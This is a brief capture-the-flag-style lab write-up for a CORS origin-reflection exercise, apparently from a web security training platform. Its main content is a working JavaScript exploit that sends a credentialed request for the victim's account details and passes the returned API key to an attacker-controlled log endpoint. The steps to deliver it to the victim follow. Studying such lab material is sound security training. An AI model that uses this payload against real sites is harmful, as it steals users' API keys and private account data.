# CORS vulnerability with basic origin reflection
## Vuln
![image](https://user-images.githubusercontent.com/60841283/150380022-d7e17a98-a9d3-40ab-8bb0-68f6339646f9.png)

## Exploit Server
```html
<script>
   var req = new XMLHttpRequest();
   req.onload = reqListener;
   req.open('get','https://acd81fed1ff42d0cc014461c009e00b2.web-security-academy.net/accountDetails',true);
   req.withCredentials = true;
   req.send();

   function reqListener() {
       location='/log?key='+this.responseText;
   };
</script> 
```
### API Key | View Exploit -> Deliver to Victim -> Access Log
![image](https://user-images.githubusercontent.com/60841283/150379179-6579332b-c12e-4b8c-979e-fd95a6223c21.png)
